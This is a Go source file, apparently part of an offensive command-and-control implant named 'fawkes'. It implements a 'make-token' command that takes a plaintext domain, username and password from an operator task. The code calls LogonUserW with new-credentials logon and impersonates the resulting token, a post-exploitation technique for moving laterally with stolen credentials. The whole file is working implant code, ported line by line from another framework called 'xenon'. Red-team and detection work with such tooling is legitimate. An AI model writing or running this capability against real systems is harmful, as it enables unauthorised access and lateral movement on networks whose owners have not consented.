//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// Global token handle - shared across token commands
// Based on xenon's gIdentityToken in Identity.c
var gIdentityToken windows.Token

// Windows API constants
const (
	LOGON32_LOGON_INTERACTIVE     = 2
	LOGON32_LOGON_NETWORK         = 3
	LOGON32_LOGON_BATCH           = 4
	LOGON32_LOGON_SERVICE         = 5
	LOGON32_LOGON_UNLOCK          = 7
	LOGON32_LOGON_NEW_CREDENTIALS = 9

	LOGON32_PROVIDER_DEFAULT = 0
	LOGON32_PROVIDER_WINNT50 = 3
)

var (
	advapi32 = windows.NewLazySystemDLL("advapi32.dll")
	procLogonUserW = advapi32.NewProc("LogonUserW")
	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf = advapi32.NewProc("RevertToSelf")
)

type MakeTokenCommand struct{}

func (c *MakeTokenCommand) Name() string {
	return "make-token"
}

func (c *MakeTokenCommand) Description() string {
	return "Create a token from plaintext credentials and impersonate it"
}

type MakeTokenParams struct {
	Domain   string `json:"domain"`
	Username string `json:"username"`
	Password string `json:"password"`
	LogonType int   `json:"logon_type"` // Optional: defaults to LOGON32_LOGON_NEW_CREDENTIALS (9)
}

// Execute implements xenon's TokenMake function from Token.c (lines 189-264)
// Matches xenon line-by-line: parse args, revert token, LogonUserA, impersonate, get user info
func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
	// Parse arguments - xenon Token.c lines 209-215
	// Order: Domain, User, Password, LogonType
	var params MakeTokenParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Default to "." for local machine if domain not specified
	if params.Domain == "" {
		params.Domain = "."
	}

	// Default to LOGON32_LOGON_NEW_CREDENTIALS (9) if not specified
	if params.LogonType == 0 {
		params.LogonType = LOGON32_LOGON_NEW_CREDENTIALS
	}

	// xenon Token.c line 218: IdentityAgentRevertToken()
	// This matches Identity.c lines 35-52: close existing token, set to NULL, RevertToSelf()
	if gIdentityToken != 0 {
		windows.CloseHandle(windows.Handle(gIdentityToken))
	}
	gIdentityToken = 0
	
	// RevertToSelf() - drop any existing impersonation
	windows.RevertToSelf()

	// Convert strings to UTF-16 for Windows API (LogonUserW requires wide strings)
	usernamePtr, err := syscall.UTF16PtrFromString(params.Username)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to convert username: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	domainPtr, err := syscall.UTF16PtrFromString(params.Domain)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to convert domain: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	passwordPtr, err := syscall.UTF16PtrFromString(params.Password)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to convert password: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// xenon Token.c lines 220-226: Select provider based on logon type
	// LOGON32_LOGON_NEW_CREDENTIALS only applies credentials when interacting with remote resources
	// Use LOGON32_PROVIDER_WINNT50 for NEW_CREDENTIALS, otherwise DEFAULT
	provider := LOGON32_PROVIDER_DEFAULT
	if params.LogonType == LOGON32_LOGON_NEW_CREDENTIALS {
		provider = LOGON32_PROVIDER_WINNT50
	}

	// xenon Token.c line 226: LogonUserA(User, Domain, Password, LogonType, Provider, &gIdentityToken)
	// CRITICAL: Result is stored DIRECTLY in gIdentityToken (6th parameter is output)
	ret, _, err := procLogonUserW.Call(
		uintptr(unsafe.Pointer(usernamePtr)),    // lpszUsername
		uintptr(unsafe.Pointer(domainPtr)),      // lpszDomain  
		uintptr(unsafe.Pointer(passwordPtr)),    // lpszPassword
		uintptr(params.LogonType),               // dwLogonType
		uintptr(provider),                       // dwLogonProvider
		uintptr(unsafe.Pointer(&gIdentityToken)), // phToken (output - stored in global)
	)

	// xenon Token.c line 228-233: Check if LogonUserA failed
	if ret == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("LogonUserW failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// xenon Token.c line 234: Check if gIdentityToken != NULL
	if gIdentityToken == 0 {
		return structs.CommandResult{
			Output:    "LogonUserW succeeded but returned null token",
			Status:    "error",
			Completed: true,
		}
	}

	// xenon Token.c line 236: ImpersonateLoggedOnUser(gIdentityToken)
	ret, _, err = procImpersonateLoggedOnUser.Call(uintptr(gIdentityToken))
	if ret == 0 {
		// Failed to impersonate - clean up (xenon Token.c line 238-243)
		windows.CloseHandle(windows.Handle(gIdentityToken))
		gIdentityToken = 0
		return structs.CommandResult{
			Output:    fmt.Sprintf("ImpersonateLoggedOnUser failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// xenon Token.c lines 244-252: Get user info to confirm impersonation
	// Calls IdentityGetUserInfo(gIdentityToken) which returns "domain\\username"
	accountName, err := getTokenUserInfo(gIdentityToken)
	if err != nil {
		// xenon Token.c lines 245-251: Error getting user info
		return structs.CommandResult{
			Output:    fmt.Sprintf("Could not get identity for token. ERROR: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// xenon Token.c lines 253-259: Success - return account name
	return structs.CommandResult{
		Output:    accountName,
		Status:    "success",
		Completed: true,
	}
}

// getTokenUserInfo implements xenon's IdentityGetUserInfo (Identity.c lines 88-114)
func getTokenUserInfo(token windows.Token) (string, error) {
	tokenUser, err := token.GetTokenUser()
	if err != nil {
		return "", fmt.Errorf("GetTokenUser failed: %v", err)
	}

	account, domain, _, err := tokenUser.User.Sid.LookupAccount("")
	if err != nil {
		return "", fmt.Errorf("LookupAccount failed: %v", err)
	}

	return fmt.Sprintf("%s\\%s", domain, account), nil
}
